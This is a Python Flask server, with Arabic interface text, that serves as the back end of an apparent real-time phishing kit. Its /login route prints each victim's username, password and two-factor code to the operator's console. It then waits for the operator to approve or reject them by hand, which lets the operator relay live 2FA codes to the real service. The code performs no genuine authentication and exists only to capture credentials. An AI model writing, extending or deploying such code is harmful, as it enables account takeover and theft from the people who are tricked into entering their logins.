from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/test')
def test_page():
    return render_template('test.html')

@app.route('/page2')
def page2():
    return render_template('page2.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    otp_code = data.get('otp_code')

    print("\n" + "="*50)
    print("📩 وصول محاولة تسجيل دخول جديدة!")
    print(f"👤 اسم المستخدم: {username}")
    print(f"🔑 كلمة المرور : {password}")
    if otp_code:
        print(f"🔐 رمز التحقق (2FA): {otp_code}")
    print("="*50)

    # التحقق من اسم المستخدم وكلمة المرور
    if not otp_code:
        while True:
            choice = input("👉 هل المعلومات صحيحة؟ (أدخل 1 لنعم / 2 لـ لا): ").strip()
            if choice in ['1', '2']:
                break
            print("⚠️ إدخال غير صالح، يرجى كتابة 1 أو 2 فقط.")

        if choice == '1':
            print("🔄 المسؤول وافق مبدئياً، ويطلب رمز المصادقة الثنائية (2FA).\n")
            return jsonify({
                'status': 'needs_2fa',
                'message': 'تم التحقق من البيانات. يرجى إدخال رمز المصادقة الثنائية.'
            }), 200
        else:
            print("❌ تم رفض المعلومات من قبل المسؤول.\n")
            return jsonify({
                'status': 'error',
                'message': 'المعلومات غير صحيحة، يرجى إعادة الإدخال.'
            }), 400
    
    # التحقق من رمز المصادقة الثنائية (2FA)
    else:
        while True:
            choice = input("👉 هل رمز المصادقة الثنائية صحيح؟ (أدخل 1 لنعم / 2 لـ لا): ").strip()
            if choice in ['1', '2']:
                break
            print("⚠️ إدخال غير صالح، يرجى كتابة 1 أو 2 فقط.")

        if choice == '1':
            print("✅ تم تأكيد صحة الرمز والبيانات نهائياً من قبل المسؤول.\n")
            return jsonify({
                'status': 'success',
                'message': 'تم تسجيل الدخول بنجاح!'
            }), 200
        else:
            print("❌ تم رفض الرمز من قبل المسؤول.\n")
            return jsonify({
                'status': 'error',
                'message': 'رمز التحقق غير صحيح، يرجى إدخال الرمز الصحيح.'
            }), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)